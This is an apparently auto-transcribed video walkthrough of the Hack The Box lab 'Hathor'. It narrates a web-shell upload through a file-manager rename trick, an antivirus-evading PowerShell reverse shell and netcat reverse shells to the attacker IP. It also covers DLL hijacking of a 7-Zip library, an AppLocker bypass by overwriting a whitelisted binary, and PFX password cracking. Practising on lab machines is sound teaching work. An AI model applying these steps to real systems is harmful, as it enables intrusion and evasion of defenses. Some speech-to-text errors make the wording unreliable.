 what's going on YouTube this is IPS I can be doing hathor from hack the box which was an insane Windows machine that I absolutely loved because if you look at the technical challenges or exploits or steps of this box they're not really that tough the tough thing comes with all the system Harding that's been put in place if you remove the hardening this box is probably a medium but because it has like app blocker preventing unsigned code from running the Windows Firewall only allowing certain programs to talk to the internet uh Powershell constrain language mode and there's some other things like ntlm being disabled like all those things that just make this box really tough and I enjoyed learning how to navigate around them and it really goes to show if the defender uses the defense and depth methodology even a vulnerable box can be made hard so with that being said let's just jump in as always we start off with an end map so Dash SC for default scripts SV enumeric versions OA I'll put all formats put in the nmap directory and call it hathor and then the IP address of 10 10 11.147 this can take some time to run so I've already ran it looking at the results we have 12 ports open the first one is DNS on Port 53 then we have HTTP on Port 80 and its Banner tells us it's an IIs server and looking at the script we have a robots.txt giving us a bunch of information so we know like there's a captchaimage.ashx file my page need HTML just general information about the website and then the HTTP title is telling us this is Mojo portal and if we looked into this this is a CMS system a Content management system similar to like WordPress and stuff just for um ASP so um yeah the next thing we have is kubros and it's telling us what the server time is and since there is Kerberos chances are it's a domain controller looking down here there is ldap and it's telling us the DNS name is wincorp Dot htb and the full hostname is hathor.win corp.htb so right away I'm just going to add this into my host file so sudo VI Etsy host then we can do 10 10 11 147 and do half a wincorp.hdb and justwindcorp.hdb save that all and going down there is 445 open there is um secure ldap so nothing really too interesting here um we could try like an SMB client to list shares on this box so 10 10 11 147 and when we do this we get NT status not supported not any type of authentication failure so this is telling us that it's most likely ntlm is disabled so we need use Kerberos to authenticate to this domain and we could use a tool like curb root to potentially enumerate valid users on the domain but in the sake of time I'm just going to go enumerate the web application so 10 10 11.147 and we should get a page there we go and we see home Mojo Mojo portal it's taking a little bit of time to load while that goes we could Google like Mojo portal GitHub and see what this is we could also do like a search point on Mojo portal and see there are two vulnerabilities um I'm looking for like a time of this vulnerability it's not telling me the date let's see if we go search Point Dash X we can see this one is in 2020 and the other one it has a lower number so I'm going to guess this is even older uh let's see is there any date I don't see a date here but based upon the number being lower I'm just assuming this is an older vulnerability but going to the page we just get a message that says page under construction if we click on home there is new page if we click here we get to page not found we can click sitemap and the site is pretty empty if we click on login we can get to an email and password if I just try a random email like root ipsec.rocks put the password of password try to log in we see login failed if I send this over to burp Suite we can see exactly how this request works so I do password Here and oh man that's sending a lot of information so this is probably because it is.net we have a view State generator validation just a bunch of General things.net websites do click forward and it looks like it's probably returning that page if I try like root at wincorp.hdb do password we get login failed as well if we do recover password try root at ipsec.rocks we get username not found so chances are if this was a user we have a potential way to enumerate valid users because I'd assume it would say like email sent so um validating users on a website it's generally a low finding sometimes the um website doesn't care it's all dependent on I guess who's maintaining it we can try creating a new account so I'm going to create ipsec root at ipsec.rocks password of password security question ASD DSA I guess and we'll do if SEC create this account count has been created so now if I go back home it looks like it's pretty much the same thing there's no login button down here so I know I'm logged in if I click this there's just new page if I click this little gear there is a member list and we can see admin if I click on view profile we can just see the name admin here nothing too interesting I'm going to log out and then we're going to go back to login and validate that we have a way to enumerate valid users so if I try to log in with this or reset root at ipsec.rocks it says please answer your password question I do DSA and it's going to probably tell me it has emailed me it's probably taking a while because email is not working on this box but that does confirm that we can validate valid users so the next thing I'm going to do is try to Google if there's any default passwords associated with Mojo portal so Mojo portal default password and we can see admin admin.com for the email and admin for login name um we could go back here and go back again and try logging in with this and it says what is your username so there is definitely um an account here so let's login and should I admin admin.com and the password of admin and we log in and since we're administrator we have more functions on this left hand side if I click on Administration we can go to system information and it shows general information around the website the asknet version operating system version Mojo portal version and we could probably compare this version to the search point and find out um this is just too up to date for it to be vulnerable to any public exploits that being said if we go to file manager it does let us upload files so whenever I try to upload a file I'm going to do um like an asp shell on Windows because we know it's executing aspx files so I'm just going to Google like 10c aspx reverse shell or maybe I should do web shell um or here web shell cmd.asbx so this looks like it could be a good shell I'm going to copy this we can download it and then attempt to upload it to the Box so let's go click here upload files select and then let's see htb hathor cmd.aspx and I'm going to intercept this request uh file type is not allowed so let's try uploading again we can try changing the file type here so um I think like image JPEG and we can forward this along we still get file type not allowed upload it again um let's try CMD aspx.txt forward it and we have uploaded it but since this is a um dot txt extension it's probably not going to be executed but we should see if I can figure out where this file exactly is so I'm going to try to download this and we can see it's making a database call it to download it so that doesn't help us we want to find out exactly where this file is on the operating system if I go to under construction that sounds like exactly what we see here page under construction I can open this image in a new tab and I see it's stored under data sites one media so if I just go to this directory we can't list it but if I do cmd.aspx.txt we can see this is where the file is stored so if we can probably remove this.txt so it's just cmd.aspx we would be able to get code execution on this box so if we went back to the GitHub this is generally what I would be doing here and it's interesting about this box let's see go back to the GitHub we can go into issues and then I delete all the filters and kind of just glance at the issues but we see one vulnerability and Legacy file manager now I want to say this box was released in April of 2022 and this was created uh last month October of 2022. and it's talking about there's a vulnerability in the Legacy file manager and let's see when renaming files one can um change the extension so let's play with this if we try to rename it and let's make sure we're intercepting I can afford that request along rename and I'm going to change it to be just cmd.aspx we can forward and says this type of file is not allowed so let's try moving so move it and we probably need to intercept off until we decide on a location um so it's in media right now we can try moving it to logos I guess see intercept on select this move so now we're moving it into logos and it doesn't look like it lets us change the name when we move it I'm going to try just specifying the name and not allowed so let's try the very last option which was copy so enter a new name for it I'm just going to say cmd.aspx which it did for me and then when we go um we didn't get an error message it's not showing up in the file manager but generally it said extension not allowed right so let's try going in sites media cmd.aspx and it's taking a second oh it's by try and go through burp Suite Maybe there we go we have a web shell on this box so if I click on run nothing happens um I'm gonna try run I'm going to change this to who am I and then do run and we get wincorp web so we know we have code execution here now the odd thing is we did net user and we got nothing um with a lot of just window shells in general they don't redirect standard error to standard out so I'm going to put this in quotes and then we can do two and one so we're redirecting standard error to standard out and we do run we just get access is denied I think it said our user was web so we can try this and we can see um the information about the web user we could try administrator as well and get that information so we can do some basic enumeration on this box the very first thing I do is who am I slash priv command so I can see if I have SE impersonate because if I do then I would try to go with a potato style attack like rotten potato juicy potato whatever um I don't see SCM personate so my first step is to probably get a reverse shell so let's do maketer dub dub dub and then CP user share Machine the shells and then invoke I think Powershell TCP one line there we go you can copy in this directory and then we can edit the script and we usually don't need to do this over a web server if we don't want to we could just do a whole Powershell encoding thing which will do um so just change the IPL 10 10 14 8 put 9001 here and then we can echo or if not Echo at this and then I convert utf-16 little ndn because this is how Powershell encoding wants it and base64-w0 um we need a dash T after I convert and we should be able to paste this into a shell so we can just do Powershell Dash ENC paste it in and see lvnp 9001 and when we hit enter we'll see exactly what happens looking at my shell I don't have anything and then going back to the web page we can see we have some type of error message and if we look um it's got this script contains malicious content has been blocked by antivirus um so I guess we have to fix that so let's just edit a few variables um Defenders very static signature based so what I'm going to do is replace the client variable and we're just going to call this C so we can see all the clients have been replaced and then I'm going to edit send back so let's do send back I'll replace that with SB and then let's see what else is there um we got send byte so send byte we'll go s byte and the weird thing is from I forget what video we did it on um Defender likes flagging on this string so I'm going to rename this we'll do lowercase and then get rid of the path and then I'll put it equals like this and instead of PS I'll call shell so all that line is is like the um bash prompt right so we changed the bash prompt from PS path this to um probably shell this so it just looks different um didn't change the functionality at all really so let's re-encode this copy and clvnp 9001 and then we can go back replace the base64 hit enter and let's see what error message is it now pairing module first use and we see cannot create type only core type supported in this language mode and we're in um probably constrained language right we could validate that by going back to our Command and oh my God let's uh maybe if I get rid of find there we go and now I'm just going to replace this whole string we can say um execution contacts Dot session state and I'll put Dash C right host and let's see what we have um what if I don't do right host there we go um we have the language mode in constrained language so this is a very limited version of Powershell where we can't do um a lot of the.net reflection which is required for getting a reverse shells um so what I'm going to do instead is try to upload netcat right so if I just go on my host we can do locate nc64.exe and I'm going to copy a version of netcat um we'll try this one so CP this over here and then we can get it on the Box by going back into the file manager and just uploading it and renaming it so I'm going to cpnc64.exe to give it the txt extension and then we can just upload select and upload the txt and with this we can copy and remove it so now netcat 64 exe exists in this directory we have to find exactly where it is on this um server so that would be easy with a shell we're just going to do dirc colon and it's probably going to be under inet Pub right oh um Dio not see colon we just want slash um inet Pub we also have this get bad passwords thing that is interesting but a net Pub uh probably dub dub dub root then let's see if I go back here um it's probably data sites is there a data here there is so we can do data sites one and I think it was media and we have nc64.exe I guess we didn't even have to rename it because we could have renamed it here but now we can try executing this right and see 64. exe Dash e CMD 10 10 14 8 9001. and when we try to run it we see this program is blocked by group policy and it's important you put this 2 and 1 here so you can see error messages from your shell so this is probably going to be like app Locker right so let's do Powershell Dash C get app Locker policy Dash effective Dash XML and this will output the app Locker policy in XML format um we can copy this V oh let's just go up one directory applocker dot XML paste it and then I'm going to run Firefox applocker.xml so we can open this in Firefox and go through it the first rule is allowing signed AP or appx packages which I think is from like the Windows store or something I don't know exactly what app X is but it's just allowing signed versions of those to run then we have dll so this is enabling Microsoft dlls to run that are signed um the next thing we have is this is odd OS Drive share scripts 7zip 64.dll is specifically allowed to run so I'm going to create the notes dot text I'm just going to put that there because it's something we should take a look at this next one looks like a default rule all dlls located in program files allow that execution then we have this OS Drive get bad passwords and another dll so let's paste this just to keep track of all these weird exclusions this one is um loading dlls located in the windows folder then the next one again looks like another default all dlls located in program files um local administrators to load dlls let's see this is EXE and this is enabling msdt.exe I don't know exactly what that is we can just move on this is presentation host more Microsoft things here's where we see something a bit unique because it's signed by when Court the DC and this looks like it's just allowing files that are signed from the certificate coming from the DC the next thing we have is auto wit and this is like an I guess scripting program to automate a user on the box so this is interesting um we should find exactly where autoit is because things signed by them can be ran we have mshda I think that's like running VB scripts and things um Ms build and this one is oh mshda Ms build look these are deny so I think this is denying a bunch of lull bins install util we can't run um let's see is there any other things that's another Ms build but they're blocking access to some of these windows executables that are known to execute code um additionally we have like blocking out of tasks um task is a directory that's generally user writable and if you look up here some of these directories or not directories rules enable um any program inside of Windows to execute but down here we have some directories that are blacklisted like this task directory there's probably going to be a directory where the printers are stored because there's a user writable in Windows and Common App blocker bypasses reg server 32 that's another lull bin that's blocked here's that printed directory I mentioned just anything put in this uh action is deny because again users can write under this directory and as you saw above there's a lot of things that just say allow execution under SQL and windows um so I'm going to kind of skip over a few of these because it looks like it's just like lull bins General window stuff directories um let's see is there anything else that's interesting we have an exclusion specifically for BG info 64.exe this is a common thing you'll find like sis admins used I don't see them use it nowadays but it used to be super common to put information on the desktop of a PC so if you ever went logged into our server or something and saw the desktop on like the bottom right has like the hostname how much space is left things like that that's going to be the program BG info I think it stands for like background info.exe bash that is denied so that's probably another lull bin machine keys this I think another directory users can write into um let's see is there anything else that is interesting here regasm tracing I'm gonna go with pretty much everything else seems standard window stuff just so many app blocker rules um here's another one that has the certificate so it's allowing members in the F1 group to run script that looking and oh that's a different rule um I think this is just another thing for um scripts to be able to be ran that are signed by the certificate on the DC um we have another login.cmd I don't know exactly what this script is so we can put that there and we could view these scripts right um if I just go back here get rid of this Powershell thing and do dir slash um there is a script and I guess we can't see login.cmd we could potentially go into the get bad passwords so if I do a dir go in here we can see uh there's a bunch of folders here if we Google what get bad passwords is we can see it's a um I want to say yeah Powershell script to get bad passwords in the domain so it's going to do essentially a DC sync pull a bunch of empty hashes and to compare the empty hashes against a black list of empty hashes to discover if you have like summer 2019 January 2019 Etc as a valid password in your domain so that's the purpose of this um let's see what directory is here custom I wonder what run.vbs is so I'm going to do type get bad passwords slash run.vbs and we can see is going to create wscript.shell looks like it's creating some event ID check passwords and then running a command and then this is the signature block that is signing the script which enables it to run I bet if we looked at this um certificate it would be one that comes from the domain controller so let's check out the accessible directory so I'm going to go paste this in change the type to a dir and we can see um logs and info.txt so I'm going to check out what info.txt is so let's do type and let's see one for CSV one for logs doesn't really give us too much information let's check out csvs so we can go back to a dir and then replace this with csvs and we have a bunch of commas separated value files so let's try checking one of these out so we can do type and what we see is uh the user Beatrice Mill has a leaked password so I'm just going to go to crackstation and we can paste this ntlm hash in to see if it cracks quickly and the reason why I'm doing it this way and not doing it through just like hashcap itself is because if it's found by this whole bad password thing we know it's a publicly known password because it doesn't do any cracking itself it's just doing a check against a list like from crackstation so we have a password here so I'm going to put V uh creds.txt and let's see we can put that as the password and go where was it this one the user is Beatrice Mill and before we try using this password um I just want to get a reverse shell to this box I kind of skipped it I didn't plan on skipping it when I did this box manually um I got a reverse shell but it just didn't flow naturally when I'm doing the video the reason why we can't get over a shell is because netcat is blocked by Group Policy but these whole aspx files can run right so if a reverse shell was within an aspx file and didn't like require executing a different executable we'd be able to get it to run so let's just Google um the n insomnia shell aspx and we can just grab this raw we can copy and then curl Dash o and somnia.aspx save it and then do the same thing we've been doing before and uploading the file I'm just going to rename it to have dot txt so we can upload it so let's go to insomnia upload and then where is it copy remove the txt and if I can spell it correctly or at least spell it the way I spelled it before we get this right so if I just do 10 10 14 8.9001 am I still listening somewhere I don't believe so so let's just start up listener click connect back and we get a reverse shell um it's not going to be too helpful because we already found the file we needed to to get the um credential the issue with this is going to be we have to make a cub roast ticket with this credential because um SMB is disabled so if we do like SMB client Dash U Beatrice mill then 10 10 11 1 47 let's add a dash l capital l and paste in this password it's not going to say good password or bad password it's going to say it is not supported so this is where we have to create a kubrows ticket and my favorite way to do that is through M packet you could just use the internal Kerberos on Linux with knit and stuff but um generally I just use them packet scripts I'm not exactly sure why I perform this way I think I just know the error message is better so we're going to get a ticket granting ticket AS wincorp.hdb Slash Beatrice Mill and then we have to copy her password so let's grab this I love God a good password so do this then put the password here and we can see it saved the credential if we put a bad password let's see what happens we have pre-auth failed if you put a bad username I just add an S there you get principal unknown so I always like seeing these error messages um I'm just going to retrieve another ticket here the key thing or one of the things about impact it though is whenever you generate a ticket it's going to be valid for 10 years instead of 10 hours so it is a bit noisier but um I don't really see too many detections on that so now that we have a ticket we can't immediately use it because if we try like SMB client Dash k for Kerberos Dash capital L we can say hathor.windcorp.hdb if we try this it's going to um error out because we didn't specify the Kerberos ticket so we want to do krb 5 CC name is equal to Beatrice Mill dot CC cash and then we're going to get no logon servers because we have to edit our Kerberos file on our Linux machine so Etsy um kb5.com and then I'm going to change scrm.local which is another hack the Box machine to be windcorp.htb and then for the KDC we can do hathor.windcorp.htb and it's going to sound silly but the default realm it it is case sensitive so want to make sure that is all n capitals up top there so now when we run this uh no log on servers still what windcorp.htb [Music] oh there's a DOT seum.local here um s-c-e-r-m .local wincorp.hdb there we go now everything is changed did that matter it did not let's see let's open up Wireshark to see exactly what's going on we ran that and let's see we get this SMB then it goes to 10 10 11 147. I'm going to try adding a dash U for username Beatrice Mill at wincorp.hdb still no logon servers let me just try pinging this we should be able to get to it right we can so let's add to our host file resolve.com and we can specify name server 10 10 11 147 so using um the domain controller as the DNS server maybe that's going to do it and it looks like that was it so we just had to update our resolve.com I'm guessing it try to make some DNS request I don't know exactly what happened there but we can see SMB client is working if we wanted to cheat we can use crack map exec and I am on version 540 um I know with five one zero it was actually broken so always make sure to update crack map exactly do so many new features but we don't even have to update that um Kerberos file so if I just go Etsy let's do a sudo move KOB oh not move oh we we want it to exist um let's CP krb5.com to krb5.com Dot hathor and I'm just going to move my old Kerberos file over top of this one so if I less it we can see it's back to scrm.local and let's go back to my main directory in order to make sure this doesn't work because a Kerberos thing is not set and it's taking a while but while that runs let's just cheat and use crack map exec so I'm going to do CME SMB hathor.windcorp.hdb specify k for kerbros dwindcorp.hdb U Beatrice Mill Dash p I think it was four exclamation points I love good 17. and then dash dash shares so we'll see which one wins out I'm guessing this isn't gonna work at all because a Kerberos file is incorrect and then we have crack mapping is that going and let's see what it does I'm actually surprised it's taking this long let's see what is it doing we're doing DNS it's failing to look up a bunch of patho.win Corp what is this ping failure ping 10 10 11 147. okay I can talk oh there we go so we can see um SMB client failed because again the Kerberos file so I'm just going to copy this one back so we have it for later in the video if you want to see it again it's just the winquip.hdb but crack map exec doesn't care about it so it's always nice to use crack map exact to do kerberosi things because you don't have to worry about your machine's configuration nearly as much so we do have this share file or share folder that we have read write access to as Beatrice Mill so let's go spider it I'm gonna run the same command but this time Dash m capital and we'll do spider plus and actually let me control see that I'm going to run a time so you can see exactly how long this takes I want to say it's probably going to take a minute and 30 seconds or 45 seconds so I'm going to pause the video and let this command finish we can see it took about a minute and 25 seconds and the output is stored in this directory so if we just cap this file we can see it doesn't look too pretty if we just pipe it over to JQ then we can do a map underscore values and then keys and this is much more manageable and if you're confused by that all you can always go to ipsec.rocks which I'm trying to put up on the screen now and you can search like JQ and this is a really good video the manly press Bloodhound where I talk about JQ but you could even go further and do JQ spider plus and see videos of me explaining it potentially better but um back to this we can see inside of the chair or the share named share we have autoit x64.exe BG info this 7zip 64.dll and that is interesting because in our notes we do have um this is app Locker policies that we did earlier in the video um bypasses I'm going to call it a guess um we do have that dll right we also have BG info 64.exe and this login.cmd which we don't have anywhere in this output so if we can either access BG info 64.exe or modify this dll we can potentially get code execution on this box so what I'm going to do is let's go to SMB client so SMB client and access it because I think this will be able to show us um more information about this I'm not exactly sure how to have like crack map exec show the file owner and things like that um and this is not either so [Music] um we could try just um replacing these files to see if we can so I'm going to first get BG info 64.exe to download it to um my computer and then we can put BG info 64.exe and we get access denied if this was a dll let's try this real quick so we have it right here let's CP BG info Dot dll and then just see if we could upload it so let's just do dll and do we get access denied or does this go through it does go through so what I'm going to do is go into scripts and we're going to try the same exact thing just replacing this 7zip64.dll and my theory right now is we have Auto wit and a bunch of autoit scripts this au3 are using 7-Zip so if we can put code here maybe when Auto it runs we can get code execution through like a dll injection so what I'm going to do is just touch and we're going to create a empty file actually we can just get the file so we can always restore it afterwards um I can't stress that enough whenever you um are going to modify something always download a backup copy and we can see we have downloaded and uploaded it so we know we have right access over this 7-Zip um dll and the next thing I'm going to do is enumerate the firewall and this may not seem logical I should have done it before when we're looking at app Locker rules but it will save us a lot of time because this part when I was just doing the Box took me forever to figure out because I kept trying to put like a reverse shell in this 7-Zip 64 dll and was getting blocked so um let us get a shell in the box I'm going to do RL wrap and see lvmp 9001 and then we can go back to here send us a shell and I can type Powershell and we can just do a get net bio wall rule Dash policy store active store and what this is going to do is um list all the firewall rules and it's going to be very reverse and show everything and we don't care about everything we kind of just care about the um action set to block right so we can just do where dot action um is it Dash EQ block like this I want to say that'll work and now we just have a list of what is blocked it's still a bit verbose so I'm just going to do select display name so we can just see all the display names of what is blocked so C script 64 and 32 uh ps6 32 and 62 ISC this and this is Powershell probably this is Powershell ISE this is the registry editor run dll so all these programs are being blocked from the internet and that's one of the cool things about Windows Firewall is you can specify it not only at a program level but you can also uh to find it at a user level as well but what I'm going to do now is actually we can just go up I want to look at exactly what this block Auto it is because if you just read this it doesn't tell us um what is blocked and well it just says the action is blocked but how does it know what Auto it is so let's copy this name and then we after the Polish policy store active store we can specify name put in that ID so we only get this and we can pipe this over to get net firewall application filter and we can see auto wit is defined by this right we could do the same exact thing if we go up and you wanted to see exactly what um let's see where's PS ISE 64. like you may not know exactly what this means based upon the display name so again we can just copy this unique identifier and then replace it right here then hit enter and now oh we know exactly what PS ISE is it's this file right so this is how you can enumerate the firewall rules but because Auto wit is blocked from internet access we can't just create a dll that sends us a reverse shell so we're going to create a dll that just executes some commands the first thing I'm going to do is have it execute ping and ping is going to work even though it's blocked because autowit is launching ping so um it should work or maybe there's a wait list for Ping that's just allowing it to run or maybe it's specifying TCP only let's see enable profile action block I'm not exactly sure but ping should work so let's create a dll and this is again probably going to be off ipsec.rocks if we just um type dll GCC uh when the template's going to be based upon this video All About dll hijacking so if you want it explained go to that video I explained a bit better there but we're just going to include windows.h and then create the function and give it the handle uh the reason that we attach and let's see reserved okay and then we can create a switch and then we do case I think it's dll process attach system we'll create that command in a second let's break here and this return true end so we have our dll and we can create a system call to do cmd.exe slash ping 10 10 14 8 which is my IP address save it and then hope we don't typo and we'll know if we typo after we compile it with um Min GW we want GCC [Music] uh Dash 132. and we specify dlo.c give it the name this is going to be 7zip64.dll and then Dash shared because it is a dll an error let's see expected semicolon after Trill there we go so now we have a dll if we just strings the 7-Zip thing all it's going to do is Pingus so I'm going to do sudo TCP dump Dash I ton zero icmp and then where do we have a SMB client so now we can just run this put command again and we have uploaded the modified 7-Zip dll and is this this is us pinging the Box I don't know why we're pinging cs-e-f grep ping something is just constantly pinging it or is that it pinging us and US responding that was weird right there we go so I think that is us I don't know if that's a ping though I was expecting to see it go to us first and then us respond but maybe not maybe this is it it's not sounding anymore so I think that's it let's just do ping 10 10 14 8 see what this looks like and no this is what I would expect the hathor coming to me and then me responding so I don't know exactly what this is probably just random SMB uh communication but because we don't see hatho reaching back to us I don't know if we have command execution so let's see let's exit this I just wanted to make sure I was where I thought I was so grep CMD this is it cmd.exe C ping that looks good we can copy this again CD Scripts dir and we see the size 91683 that's probably us anyways uh not close terminal copy paste hit enter twice and we're going to see if it eventually does ping us and I had paused the video but eventually we have a lot of spam so we got more of these unreachable messages and then the Ping what I'm going to do is a different filter I think we can do and Source host is 10 10 11 147. and I think this will work because all these spam messages are um starting with me sending to hathor right so by doing this if I just do a ping let's just do one here um it's Dash and on Windows not see go back here and we did not uh one patch captured I think I need a dash and maybe to not do DNS resolution there we go that's looking better so this confirms if we see this we got a ping let us go back to SMB client make sure we put a new copy and then we're just going to wait and see if we get requests and here we go we have four different pings come in so we have validated we have code execution so the next step we want to do is edit our dll to actually give us some useful information and again this piece of the Box takes a very long time so we're just going to speed it up by um just knowing what to do I guess and cheating a little bit right so I'm just going to put this in single quotes to make my life easier we want to do who am I slash all and then we can write this output to um I wonder if I want to do two slashes so just do a one probably two right now because I'm in a double quote um we can do users public and then please sub dot text right and we probably should have left that ping there so we know it actually runs successfully so I'm going to do ping 10 10 14 8. and the other thing we want to run we want instead of doing who am I let's run I cackles and what this is going to do is print the permissions of everything so I'm going to do eye cackles and um whoops did not mean to click C colon share like that copy this a few times because we want to get every file in here because we don't want to run this multiple times right okay so what are we doing who am I I cackles on the folder C colon share eye cackles on C colon share and any file in it and then going into the scripts directory as all just seeing exactly what we can overwrite so now let's compile this um x86 there we go uh warning string constant too long for its type did not like that did it I'm guessing it's still going to fail if I just change it to all double quotes right I don't think we actually need to do it this way but let's just for Sandy's sake test it out nope it works so let's now put a modified version up and do a TCP dump and we'll see um if that file exists after we exploit it so we can do CD users public and there should be a oh it's already there wow do we have a ping we do so I guess it happened as I was switching over to this right so let's take a look at or who am I so we are Gina Wilde and we got line wrapping issues um I'm just going to copy this that's the start of it let's go to a new window please sub.txt paste less dash s on this there we go so let's see this is telling us all the groups we are so we're a member of IT department and protected users this is a Microsoft group I believe I think it just means you can't delete the user um and all these are also built in so the key piece being it Department privileges we don't have any dangerous privileges here and oh God that that did not print well um let's see let's just go back to this because we can actually read this output um not sure what happened but I digress so C colon share nothing too interesting here I guess it Department is oh I I think this is owner shoot um I was not prepared to explain eye cackles so let's see um BG info 64.exe I.T Department uh right owner who is the owner of this I want to say all these eyes mean inherited right and then we have the N this is going to be no so like web has no access it's explicitly denied um this is read execute I want to say and then right owner system has full access administrators has full access I don't know why I can't see the owner of this if I had to guess it's built in administrators because um it has the most privilege maybe one of these is owner I don't know what DC is but because it department is here this means we can take ownership of this and then be able to get read write access to this right so we don't have to go through all the other files here we can just um go back to our dll is this where we did it that's not I don't know what that msf Venom is that's from a long time ago probably so we can go edit or dll and what we're going to do is remove one of these carrots so every time this runs it overwrites the full preset Please Subscribe file erasing the previous output so we don't get confused then we're going to run a take own command so if I just do take own slash Force C colon chair BG info 64.exe and then we're going to do an eye cackles on this again to see what it says I'm going to leave the Ping here so we know it ran and that looks good to me so we can GCC um got a semicolon GCC upload and ICM p or TCP dump I should say and I can just do a dir again on this 927 what's the date 9 28 did that actually run as I was talking no so let us just wait for the pings to come in so it's been a few minutes and it looks like the um autowit task has been open multiple times because we can see at 2035 and then again 2038 but the pings aren't important it's just an indicator that it ran so if I do a dir again we can see it went from like 33 000 bytes to just 3600 so um let's type this file out to see exactly what it is and we can see BG info we are the earners we know we did a take own command but I don't see anything about my user and my user is I want to say it was Gina something Gina Wilde so what we need to do now is edit the cackles to give Gina Wilde access to this um our shell is web so we can't do it as web uh we'll have to go back into um the dll and add another command here so we're going to do a cackles and a slash e then slash g this is going to be edit and this is going to be um add so we're going to edit the cackles to add Gina Wilde and give her full control and I think that is all we have to do well after that I guess we want to execute this because again we're web we want to execute um not execute BG info but we want to copy our um netcat shell so copy C colon backslash uh where was this the IR um INF Pub www root data then sites one media I think yes this is the file we want to copy so slash nc64.exe we're going to copy netcat over top of BG info and the reason why we're doing this is if you remember back in our notes when we were looking at app Locker rules um BG info is whitelisted right and um it's a white list not or an allow list not a deny list so we can't execute nc64.exe because AppLock is just denying any executable it doesn't know but by copying nc64.exe over top of BG info 64.exe Now app Locker is going to think it is that because applocker's rule is just based upon the file name they didn't do a hash or a signature or anything like that with BG info so and this will just allow us to execute it so now with this we should be able to just do a CMD C then C colon share BG info 64.exe always make sure to do double backslashes and then Dash e CMD 10 10 14 8 9001. okay and we I guess we won't do that ping anyways because um we're not doing any type well are we I don't think we're doing any type of backgrounding so I think the dll is going to hang right here but maybe the CMD slash C is going to start a new process opening a window and continue on I honestly don't know we'll find out so think this is all we need the if this doesn't work my guess is going to be um oh whoa sharing violation that should not happen huh or L wrap one of I no longer have access to this dir 7-Zip okay so maybe the crown was running and um the dll was in use maybe that's what that error message was but as I was saying um I think it was on a different topic but if I see the Ping and I don't get a shell um my first guess is going to be I did not have access to um the inet pub directory and I'll probably move netcat to like SQL and uses public or SQL and program data copy it there then use that place because I'm not positive if Gina Wilde has access to this web server so um yeah we'll just see what happens here um I hope I compiled it did I like I'm having all the second guesses right now um let's see packets captured yeah I think I compiled it I think that's this one right here because that's me opening it and then compile so pretty sure I compiled it we can do a DIY again three six eight two nine thirty nine and it is 9 49 so it's definitely has not been Ran So we'll just wait for a shell so we have it doing a successful ping but um no shell so let's take a look at this real quick if I do a dir again we have a different size here so let's just um view this and then we're probably going to copy netcat to a different location so let's see Gina Wilde group user claims did only do oh we don't have a cactus command anymore I guess so we do CD backslash share oh we don't have access here so let's go users public and then I'm going to copy my netcat so we can CP this here we do a dir we see nc64.exe is in C colon user public we can eye cackles n64.exe and let's see Interactive I'm guessing Gina has access to this but I guess doesn't hurt to do a calculus command again to add Gina Wilde to this let's see um made my cackles command was wrong and that's why it didn't work so let's see slash g use a colon perm this is what I did so G Gina Wilde and then F full control does this say why it's erroring successfully processed one file and then to split wait what that's gonna be weird Behavior going up let's see I don't see Gina wild here let's see what are we doing wrong cackles slash e edit ACL instead of that oh we do the file name first nc64.exe to I guess that's probably what went wrong so thankfully my troubleshooting of um the whole process found the issue with their command because I'm guessing we have read access to it but this um calculus command is wrong see colon share BG info 64.exe like this there we go well that's embarrassing do this then whoops I closed out of my share dir CD Scripts and then we can put 7-Zip and just double check I have compiled it put it there it copied and now let's wait to see if we get some more pings or over a shell and there we go we have the reverse shell and it's also important to note um we don't have the pings going on and again the reason why we did not get pinged is most likely that this is a blocking command meaning it's not going to go to the next line until after this is finished so as soon as we close the share um that's one will get pinged and this is important because if you're doing dll injection on um just in general um the you break the program if you don't thread everything but um it's a different point so let's go do it who am I here to confirm yes we are now Gina Wilde um I guess I can't clear the screen because I did not RL wrap and I want to do a RL wrap I should have shoot am I gonna get it in time probably not I was hoping I'd be able to see the pings here but let's get another share um not share but another shell um I want to use RL wrap so I have the up and down arrow so now I have a shell and we are Gina Wilde if we looked at her desktop so users Gina wild desktop we would see user.txt and we still can't really run winpies I guess we could if we overwrote the like BG info file but it's now being used by a shell so I don't even think we could do that let me go to share real quick does that break it let's copy BG info 64.exe uh we don't want to copy we want to move BG info 64.exe to BG info 64.exe dot back can we do it no we cannot because again we're using this uh file for a shell so that's why we aren't going to try to like run wimpies and I don't know a good way to um know to enumerate this next step but there is a recycle bin for every user on Windows and if we go into the recycle bin we see files and if I do who am I slash all we get the um domain Sid for my user so it ends in 2663 and we see a file in the recycle bin that ends in 2663 as well um and we have to do dir a the slash a shows hidden files there is this Sid I don't think we can go into this if I do CD access is died if we want to see what that user account was we could use wmic and then user account where Sid is equal to this get name full name uh no instances interesting so wmic isn't working I'm not exactly sure how to check um this I'm guessing it's not working because net user's not working um I know there's a user let's see oh net user web did not work net user administrator that one works uh net user Gina wild so I guess we can't enumerate other users on this box I'm not actually sure um how the author did that maybe I'll look at it in a separate video I just want to check one thing real quick CMD if I do CMD aspx I just want to get back to this shell and I want to try net user Gina Wilde okay so I can enumerate users this way is there a slash all um net user Gina y old nope let's see since this has more privileges I'm gonna try the wmi command from the web shell maybe it'll work it does not so if we do two to send that we still get the no instances available okay so let's just go into um or you uh Sid or CD this Dr a here we can see there is a pfx file so I'm going to be lazy I'm just going to copy this pfx file I think it's actually copy and we can probably copy to C colon share and then since it's on the share we can go back to where we have an SMB client which I thought was here uh maybe it closed so connect do a dir and we should be able to get this file there we go so we have downloaded the pfx file so let's try to view it so we do file escape the dollar sign and it says just data we can do strings against it and we don't really get anything if we xxd it doesn't really tell us anything either so I'm used to seeing like it at least identify the certificate so let's try using open SSL pkcs12 and do an info on this file and open as though says Hey enter the import password so we know this is now an encrypted certificate so I'm going to use a tool called um crack pkcs12 it's a very creative name for this and I think we have to actually sudo VI Etsy resolve.com because my name server is pointed towards the Box so of course Google's not working um does it work now Google yep in fact pkcs 12. go to the GitHub page and then we just we can go and opt get clone to download it and then we just have to compile it we do dot slash configure then make and we can do a make install as well uh permission denied we can pseudo that there we go so let's go back to where it is and we can say crack Peak ACS 12-h and see exactly what we need to do um we want the Dash D for dictionary file so users share word list rocky.txt and then I'm guessing it's just the file name after that so let us put that file there if you're wondering how I'm cycling through previous arguments it is alt and period and pretty much immediately we get the password as ABC easy as one two three so let's do this no out command again input the password and this time it looks like it decrypts potentially or at least display some information it just says certificate bag pkcs S7 and shrouded key bag so now let's try actually extracting the certificate I'm going to get this Dash info command L and we're going to specify dash out cert Dot pem and then new keys ABC easy as one two three and we should have a cert.pem file if we file it it says ASCII text we can view this by just doing the open SSL x509 because that's the type of cert this is cert.pem and we want to specify text and 